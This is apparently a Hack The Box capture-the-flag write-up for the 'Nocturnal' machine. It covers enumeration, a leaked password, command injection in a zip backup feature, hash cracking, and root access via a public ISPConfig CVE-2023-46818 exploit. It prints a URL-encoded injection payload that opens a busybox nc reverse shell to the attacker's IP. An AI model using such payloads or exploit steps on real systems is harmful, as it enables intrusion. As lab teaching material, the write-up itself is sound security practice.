---
clayout: ctf
title: Noctural
date: 2025-05-24
image: /ctf/hack-the-box/machines/noctural/info-card.png
type: Hack The Box

ctf:
  - name: Noctural
    link: https://app.hackthebox.com/machines/656
    thumbnail: /ctf/hack-the-box/machines/noctural/info-card.png
    pwned:
      - link: https://labs.hackthebox.com/achievement/machine/585215/656
        thumbnail: /ctf/hack-the-box/machines/noctural/pwned.png
---

# Enumeration

## Nmap Scan

The initial step involved performing a comprehensive Nmap scan to identify open ports and running services:

```bash
nmap -sC -sV -v -A -oN nmap.txt 10.10.11.64
```

**Nmap Results:**

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 RSA    202688700851eede3aa6204187962517
|   256 ECDSA  4f800533a6d42264e9ed14e312bc96f1
|   256 ED25519 d9881f68438ed42a52fcf066d4b9ee6b
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nocturnal.htb/
```

| Port | Service | Version                                                       |
| ---- | ------- | ------------------------------------------------------------- |
| 22   | SSH     | OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0) |
| 80   | HTTP    | nginx 1.18.0 (Ubuntu)                                         |

The scan revealed two open services: SSH on port 22 and an HTTP server on port 80.

## Web Enumeration

### Hostname Resolution

The web server on port 80 redirected to `http://nocturnal.htb/`. To resolve this hostname locally, the following entry was added to `/etc/hosts`:

```bash
echo "10.10.11.64 nocturnal.htb" | sudo tee -a /etc/hosts
```

### Web Interface Analysis

Navigating to `http://nocturnal.htb` displays a login and registration interface:

* **Home Page**
  ![Home page](/ctf/hack-the-box/machines/noctural/home.png)

* **Register Form**
  ![Register form](/ctf/hack-the-box/machines/noctural/register.png)

* **Login Form**
  ![Login form](/ctf/hack-the-box/machines/noctural/login.png)

After registering and logging in, a user dashboard becomes accessible:

![Dashboard](/ctf/hack-the-box/machines/noctural/dashboard.png)

The application supports uploading the following file types: `pdf`, `doc`, `docx`, `xls`, `xlsx`, `odt`. These files can later be downloaded using a URL of the form:

```text
http://nocturnal.htb/view.php?username=<user>&file=<filename>
```

This hints at possible user enumeration via the `username` parameter.

### User Enumeration with FFUF

Using `ffuf`, we attempt to enumerate valid usernames based on the server’s responses:

```bash
ffuf -w /usr/share/wordlists/seclists/Usernames/Names/names.txt \
     -u "http://nocturnal.htb/view.php?username=FUZZ&file=file.pdf" \
     -H "Cookie: PHPSESSID=mspl3bsbgaamrho4b5sauk7u5k" \
     -fr "User not found."
```

**Command Breakdown:**

* `-w`: Wordlist for usernames
* `-u`: Target URL with `FUZZ` keyword for injection
* `-H`: Authenticated session cookie
* `-fr`: Response filter string to identify successful hits

The scan revealed a valid user: **amanda**.

![ffuf output](/ctf/hack-the-box/machines/noctural/ffuf.png)

Upon accessing Amanda's file list, we found a document named `privacy.odt`:

![Amanda list of files](/ctf/hack-the-box/machines/noctural/amanda-files.png)

**Contents of `privacy.odt`:**

```txt
Nocturnal has set the following temporary password for you: arHkG7HAI68X8s1J
```

Using it with the `amanda` account allows us to log in and access the **Admin Dashboard**:

![Admin dashboard](/ctf/hack-the-box/machines/noctural/admin-dashboard.png)

### Command Injection in Backup Feature

The dashboard lets you back up files using a zip command that looks like this:

```php
zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  > " . $logFile . " 2>&1 &";
```

Using this payload we get a shell as the `www-data` user.

```bash
mypassword%0Abusybox%09nc%0910.10.14.10%094444%09-e%09/bin/sh
```

![www-data shell](/ctf/hack-the-box/machines/noctural/www-data-shell.png)

### Lateral Movement

We found a user named `tobias` in `/etc/passwd`.

The `login.php` file pointed to the SQLite DB:

```php
../nocturnal_database/nocturnal_database.db
```

Grabbed it with a simple HTTP server:

```bash
python3 -m http.server 1337
```

The `users` table had a hashed password for `tobias`. Cracked it using [CrackStation](https://crackstation.net/):

```
tobias:slowmotionapocalypse
```

Logged in via SSH as `tobias`.


# Privilege Escalation

### Local Port Discovery

A port scan on the local machine revealed that port **8080** was listening locally:

```bash
(netstat -punta || ss --ntpu)

tcp   0   0 127.0.0.1:8080   0.0.0.0:*   LISTEN   -
```

### Port Forwarding via SSH

To access the internal service, SSH port forwarding was established:

```bash
ssh tobias@10.10.11.64 -L 8081:127.0.0.1:8080
```

Navigating to `http://localhost:8081` reveals an **ISPConfig** login page:

![ISP config login](/ctf/hack-the-box/machines/noctural/isp-config-login.png)

Using credentials `admin:slowmotionapocalypse`, we logged in:

![ISP config dashboard](/ctf/hack-the-box/machines/noctural/isp-config-dashboard.png)

### Exploiting ISPConfig

The "Help" section shows the software version: `3.2.10p1`. A known remote code execution vulnerability exists for this version: [CVE-2023-46818](https://github.com/bipbopbup/CVE-2023-46818-python-exploit).

**Exploit Execution:**

```bash
python exploit.py http://127.0.0.1:8081/ admin slowmotionapocalypse
```

![ISP config exploit](/ctf/hack-the-box/machines/noctural/isp-config-exploit.png)

The exploit successfully yields a shell as the **root** user.
The root flag was retrieved from `/root/root.txt`
